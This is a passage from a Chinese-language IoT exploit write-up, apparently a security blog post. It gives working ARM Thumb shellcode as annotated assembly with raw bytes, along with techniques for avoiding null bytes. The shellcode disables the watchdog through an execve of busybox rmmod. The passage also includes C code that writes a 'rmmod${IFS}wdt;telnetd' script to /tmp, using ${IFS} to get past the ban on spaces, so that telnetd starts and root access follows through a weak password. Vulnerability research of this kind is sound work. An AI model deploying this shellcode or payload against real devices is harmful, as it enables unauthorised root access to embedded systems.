    mov r1, sp
    eor r2, r2
    /* call execve() */
    /* mov r7, #SYS_execve */
    mov r7, #11 /* 0xb */
    svc 0x41
将汇编代码转成机器码后包含了一个\x00字节，还是需要理解shellcode的逻辑，然后更改相关指令规避掉badchar：
    eor.w r7, r7, r7     \x87\xea\x07\x07
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x786f6279           \x79\x62\x6f\x78  ybox
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x7375622f           \x2f\x62\x75\x73  /bus
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x6e69622f           \x2f\x62\x69\x6e  /bin
    push {r7}            \x80\xb4
    mov r0, sp           \x68\x46
    mov r7, #0x74        \x4f\xf0\x74\x07  t
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x64770064           \x64\x00\x77\x64  d\x00wd
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0xff786f62           \x62\x6f\x78\xff  box\xff
    lsl.w r7, r7, #8     \x4f\xea\x07\x27
    lsr.w r7, r7, #8     \x4f\xea\x17\x27  box\x00
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x79737562           \x62\x75\x73\x79  busy
    push {r7}            \x80\xb4
    eor.w r7, r7, r7     \x87\xea\x07\x07
    push {r7}            \x80\xb4
    mov.w r1, #0x12      \x4f\xf0\x12\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov.w r1, #0x10      \x4f\xf0\x10\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov.w r1, #0xc       \x4f\xf0\x0c\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov r1, sp           \x69\x46
    eor.w r2, r2, r2     \x82\xea\x02\x02
    mov.w r7, #0xb       \x4f\xf0\x0b\x07
    svc #0x41            \x41\xdf
    1111
    2222
    3333
    \x00\x00\x00\x00
    busy
    box\x00
    romm
    d\x00wd
    t\x00\x00\x00
    /bin
    /bus
    ybox
    \x00\x00\x00\x00
这段shellcode总结下来有两个重要的特点：
  1. 读取pc寄存器可获取4字节数据，然后使用b指令越过数据部分。
  2. 通过左移右移来将某些字节置零。
借鉴以上思想，通过位移来优化一下其中的\x00字节：
    1111
    2222
    3333
    \x00\x00\x00\x00
    wdt\xff
    romm
    d\x00\x00\x00
    /bin
    /bus
    ybox
    \x00\x00\x00\x00
    eor.w r7, r7, r7     \x87\xea\x07\x07
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x786f6279           \x79\x62\x6f\x78  ybox
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x7375622f           \x2f\x62\x75\x73  /bus
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x6e69622f           \x2f\x62\x69\x6e  /bin
    push {r7}            \x80\xb4
    mov r0, sp           \x68\x46
    mov.w r7, #0x64      \x4f\xf0\x64\x07  d
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0x6f6d6d72           \x72\x6d\x6d\x6f  rmmo
    push {r7}            \x80\xb4
    ldr.w r7, [pc, #4]   \xdf\xf8\x04\x70
    b #6                 \x01\xe0
    0xff786f62           \x77\x64\x74\xff  wdt\xff
    lsl.w r7, r7, #8     \x4f\xea\x07\x27
    lsr.w r7, r7, #8     \x4f\xea\x17\x27  wdt\x00
    push {r7}            \x80\xb4
    eor.w r7, r7, r7     \x87\xea\x07\x07
    push {r7}            \x80\xb4
    mov.w r1, #0x4       \x4f\xf0\x04\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov.w r1, #0xc       \x4f\xf0\x0c\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov.w r1, #0x1d      \x4f\xf0\x1d\x01
    add r1, sp, r1       \x69\x44
    push {r1}            \x02\xb4
    mov r1, sp           \x69\x46
    eor.w r2, r2, r2     \x82\xea\x02\x02
    mov.w r7, #0xb       \x4f\xf0\x0b\x07
    svc #0x41            \x41\xdf
这一段执行execve是没有任何问题了，可是这里只是关闭了watchdog，我们还想做的是开启telnetd服务，后续就可以通过root弱口令获取系统shell了。开始时想使用两次execve分别执行rmmod
wdt和telnetd，但exec调用后当前进程的内存被完全替换，也就无法进行第二次的execve了。
最终确定使用渗透中的常见套路，在/tmp目录下使用系统调用写一个shell脚本，空格可以使用${IFS}绕过，最后execve调用sh执行该文件，达到一种执行多条命令的效果：
    #include 
    #include 
    #include 
    #include 
    #include 
    void main() {
    int fd = open("/tmp/XXX", O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    write(fd, "rmmod${IFS}wdt;telnetd", 22);
    close(fd);
    }
### 完成利用
漏洞利用便是将上述结合起来，如图所示：
## 0x04 总结
  1. IoT设备上的安全防御手段和机制肯定会随着我们的聚焦而增强，也是一个有趣的挑战。
  2. 对于漏洞环境的审查还需要细致观察或者脚本化。
  3. 文中有所疏漏的地方还请师傅们不吝赐教。
  4. 有幸去了bluehat2019，IoT上的Fuzzing、高阶利用和输出积累是我个人需要提高的。